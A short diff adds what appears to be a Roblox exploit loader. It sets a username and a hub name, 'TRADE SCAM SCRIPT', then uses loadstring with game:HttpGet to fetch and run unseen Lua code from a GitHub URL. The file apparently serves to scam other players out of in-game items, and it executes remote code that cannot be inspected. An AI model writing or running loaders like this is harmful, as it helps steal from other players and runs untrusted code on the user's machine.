@@ -1,0 +1,4 @@
+_G.Username "komputer33"
+_G.HubName "TRADE SCAM SCRIPT"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
